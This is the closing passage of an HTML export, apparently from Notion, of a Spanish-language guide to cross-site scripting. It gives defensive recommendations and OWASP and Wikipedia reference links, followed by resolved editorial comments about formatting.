web.</li></ul><ul id="d900e69f-0235-4aaf-ae33-b2ea05abe643" class="bulleted-list"><li style="list-style-type:disc"><strong>Lleve a cabo pruebas de seguridad regulares:</strong> Se recomienda llevar a cabo pruebas de seguridad regulares en todas las aplicaciones web para identificar y solucionar posibles vulnerabilidades. Las pruebas de seguridad pueden ser realizadas por equipos de seguridad internos o por compañías de seguridad externas.</li></ul><ul id="c48b2e34-7028-433c-b5be-57f6b36e530f" class="bulleted-list"><li style="list-style-type:disc"><strong>Mantenga actualizados los sistemas y software:</strong> Es importante mantener actualizados los sistemas y software utilizados en la aplicación web para prevenir vulnerabilidades conocidas. Esto incluye los sistemas operativos, el software de servidor web y el software de aplicación.</li></ul><ul id="c3333ae9-d345-49ca-99c6-974eb2a09bce" class="bulleted-list"><li style="list-style-type:disc"><strong>Utilice los estándares de seguridad relevantes:</strong> Los estándares de seguridad relevantes, como el estándar OWASP Top Ten, deben ser utilizados como guías para la prevención de vulnerabilidades XSS. Estos estándares proporcionan una lista de las vulnerabilidades de seguridad más comunes y cómo prevenirlas.</li></ul><p id="f47604a9-fbc8-448b-8b11-91a88fe9473b" class="">
+</p><h2 id="4889c62c-359b-4877-b86b-a27dae1b20f4" class="">Enlaces de Referencia:</h2><table id="ea56abbf-f11a-470f-b8b8-c3f00b45430f" class="simple-table"><thead class="simple-table-header"><tr id="2f2ba91d-a54c-4a2e-a426-2d0cef687c7a"><th id="XDNa" class="block-color-orange_background simple-table-header" style="width:397px">Título</th><th id="f_;p" class="block-color-orange_background simple-table-header" style="width:1072.991455078125px">Descripción</th></tr></thead><tbody><tr id="edb7259c-ace4-450c-9a55-d9dfab2c2e69"><td id="XDNa" class="" style="width:397px">OWASP Cross Site Scripting (XSS)</td><td id="f_;p" class="" style="width:1072.991455078125px">Página web de la fundación OWASP que explica qué es XSS, qué tipos de ataques existen, cómo prevenirlos y cómo detectarlos. También ofrece enlaces a otras páginas y recursos relacionados con XSS. Su URL es <a href="https://owasp.org/www-community/attacks/xss/">https://owasp.org/www-community/attacks/xss/</a></td></tr><tr id="aa7e3ab3-6030-4196-ba86-533f74cae398"><td id="XDNa" class="" style="width:397px">OWASP Cross Site Scripting Prevention Cheat Sheet</td><td id="f_;p" class="" style="width:1072.991455078125px">Guía de OWASP que proporciona consejos y técnicas para evitar vulnerabilidades de XSS en las aplicaciones web. Incluye ejemplos de código y buenas prácticas de desarrollo. Su URL es <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html</a>.</td></tr><tr id="f750d72d-036f-44dc-a85f-d2451e975be7"><td id="XDNa" class="" style="width:397px">Cross-site scripting - Wikipedia</td><td id="f_;p" class="" style="width:1072.991455078125px">Artículo de la enciclopedia libre Wikipedia que ofrece una introducción al concepto de XSS, su historia, sus consecuencias y sus contramedidas. También contiene referencias a otras fuentes de información sobre XSS. Su URL es <a href="https://es.wikipedia.org/wiki/Cross-site_scripting">https://es.wikipedia.org/wiki/Cross-site_scripting</a>.</td></tr></tbody></table><p id="2566b286-74a1-4d89-9b90-92fab3f8d6c6" class=""> </p><p id="af5ed373-755f-43e2-a8f3-3164b5dd9b64" class="">
+</p></div></article><span class="sans" style="font-size:14px;padding-top:2em"><hr/><details open="" style="padding-top:1em"><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0">Resolved inline comments</summary><div class="indented"><div><ul class="toggle"><li><div><span class="user" style="padding:0.2em"><span class="icon text-icon user-icon"><span class="user-icon-inner">A</span></span><span><b>AGutier</b> <time style="font-size:0.8em">Jun 13, 2023, 4:29 PM</time></span></span></div><div style="padding:0.2em">Incluir nombre a la imagen</div><div style="padding:0.3em"></div></li></ul></div><hr/></div><div class="indented"><div><ul class="toggle"><li><div><span class="user" style="padding:0.2em"><span class="icon text-icon user-icon"><span class="user-icon-inner">A</span></span><span><b>AGutier</b> <time style="font-size:0.8em">Jun 13, 2023, 4:30 PM</time></span></span></div><div style="padding:0.2em">Incluir nombre a la imagen</div><div style="padding:0.3em"></div></li></ul></div><hr/></div><div class="indented"><div><ul class="toggle"><li><div><span class="user" style="padding:0.2em"><span class="icon text-icon user-icon"><span class="user-icon-inner">A</span></span><span><b>AGutier</b> <time style="font-size:0.8em">Jun 13, 2023, 4:37 PM</time></span></span></div><div style="padding:0.2em">Incluir un nombre a la imagen</div><div style="padding:0.3em"></div></li></ul></div><hr/></div><div class="indented"><div><ul class="toggle"><li><div><span class="user" style="padding:0.2em"><span class="icon text-icon user-icon"><span class="user-icon-inner">A</span></span><span><b>AGutier</b> <time style="font-size:0.8em">Jun 13, 2023, 7:10 PM</time></span></span></div><div style="padding:0.2em">Incluir un nombre a la imagen</div><div style="padding:0.3em"></div></li></ul></div><hr/></div><div class="indented"><div><ul class="toggle"><li><div><span class="user" style="padding:0.2em"><span class="icon text-icon user-icon"><span class="user-icon-inner">A</span></span><span><b>AGutier</b> <time style="font-size:0.8em">Jun 13, 2023, 7:10 PM</time></span></span></div><div style="padding:0.2em">Incluir un nombre a la imagen</div><div style="padding:0.3em"></div></li></ul></div><hr/></div><div class="indented"><div><p style="padding:0.2em"><b>Block text</b>: <mark class="highlight-yellow_background">DOM: Document Object Model</mark></p><ul class="toggle"><li><div><span class="user" style="padding:0.2em"><span class="icon text-icon user-icon"><span class="user-icon-inner">A</span></span><span><b>AGutier</b> <time style="font-size:0.8em">Jun 13, 2023, 5:32 PM</time></span></span></div><div style="padding:0.2em">Está en título 3. Cambiar a texto en negrilla.</div><div style="padding:0.3em"></div></li></ul></div><hr/></div><div class="indented"><div><ul class="toggle"><li><div><span class="user" style="padding:0.2em"><span class="icon text-icon user-icon"><span class="user-icon-inner">A</span></span><span><b>AGutier</b> <time style="font-size:0.8em">Jun 13, 2023, 7:11 PM</time></span></span></div><div style="padding:0.2em">Incluir un nombre a la imagen</div><div style="padding:0.3em"></div></li></ul></div><hr/></div><div class="indented"><div><ul class="toggle"><li><div><span class="user" style="padding:0.2em"><span class="icon text-icon user-icon"><span class="user-icon-inner">A</span></span><span><b>AGutier</b> <time style="font-size:0.8em">Jun 13, 2023, 7:11 PM</time></span></span></div><div style="padding:0.2em">Incluir un nombre a la imagen</div><div style="padding:0.3em"></div></li></ul></div><hr/></div><div class="indented"><div><p style="padding:0.2em"><b>Block text</b>: <mark class="highlight-yellow_background">Técnicas de Ataque XSS</mark></p><ul class="toggle"><li><div><span class="user" style="padding:0.2em"><span class="icon text-icon user-icon"><span class="user-icon-inner">A</span></span><span><b>AGutier</b> <time style="font-size:0.8em">Jun 13, 2023, 5:54 PM</time></span></span></div><div style="padding:0.2em">Va en título 1</div><div style="padding:0.3em"></div></li></ul></div><hr/></div><div class="indented"><div><p style="padding:0.2em"><b>Block text</b>: <mark class="highlight-yellow_background">Capitalizing</mark></p><ul class="toggle"><li><div><span class="user" style="padding:0.2em"><span class="icon text-icon user-icon"><span class="user-icon-inner">A</span></span><span><b>AGutier</b> <time style="font-size:0.8em">Jun 13, 2023, 5:54 PM</time></span></span></div><div style="padding:0.2em">Va en título 2</div><div style="padding:0.3em"></div></li></ul></div><hr/></div><div class="indented"><div><p style="padding:0.2em"><b>Block text</b>: <mark class="highlight-yellow_background"><strong>Payload</strong></mark></p><ul class="toggle"><li><div><span class="user" style="padding:0.2em"><span class="icon text-icon user-icon"><span class="user-icon-inner">A</span></span><span><b>AGutier</b> <time style="font-size:0.8em">Jun 13, 2023, 6:14 PM</time></span></span></div><div style="padding:0.2em">Aplicar concepto de las otras tablas, sombreado con el color correcto, negrillas</div><div style="padding:0.3em"></div></li></ul></div><hr/></div><div class="indented"><div><p style="padding:0.2em"><b>Block text</b>: <mark class="highlight-yellow_background"><strong>Caracter </strong></mark></p><ul class="toggle"><li><div><span class="user" style="padding:0.2em"><span class="icon text-icon user-icon"><span class="user-icon-inner">A</span></span><span><b>AGutier</b> <time style="font-size:0.8em">Jun 13, 2023, 6:14 PM</time></span></span></div><div style="padding:0.2em">Aplicar concepto de las otras tablas, sombreado con el color correcto, negrillas</div><div style="padding:0.3em"></div></li></ul></div><hr/></div><div class="indented"><div><p style="padding:0.2em"><b>Block text</b>: <mark class="highlight-yellow_background"> </mark></p><ul class="toggle"><li><div><span class="user" style="padding:0.2em"><span class="icon text-icon user-icon"><span class="user-icon-inner">A</span></span><span><b>AGutier</b> <time style="font-size:0.8em">Jun 13, 2023, 4:20 PM</time></span></span></div><div style="padding:0.2em">Incluir el enlace al módulo anterior y siguiente</div><div style="padding:0.3em"></div></li></ul></div><hr/></div><div class="indented"><div><p style="padding:0.2em"><b>Block text</b>: <mark class="highlight-yellow_background"><strong>Payload</strong></mark></p><ul class="toggle"><li><div><span class="user" style="padding:0.2em"><span class="icon text-icon user-icon"><span class="user-icon-inner">A</span></span><span><b>AGutier</b> <time style="font-size:0.8em">Jun 13, 2023, 6:14 PM</time></span></span></div><div style="padding:0.2em">Aplicar concepto de las otras tablas, sombreado con el color correcto, negrillas</div><div style="padding:0.3em"></div></li></ul></div><hr/></div><div class="indented"><div><p style="padding:0.2em"><b>Block text</b>: <mark class="highlight-yellow_background"><strong>Caracter </strong></mark></p><ul class="toggle"><li><div><span class="user" style="padding:0.2em"><span class="icon text-icon user-icon"><span class="user-icon-inner">A</span></span><span><b>AGutier</b> <time style="font-size:0.8em">Jun 13, 2023, 6:14 PM</time></span></span></div><div style="padding:0.2em">Aplicar concepto de las otras tablas, sombreado con el color correcto, negrillas</div><div style="padding:0.3em"></div></li></ul></div><hr/></div></details></span></body></html>
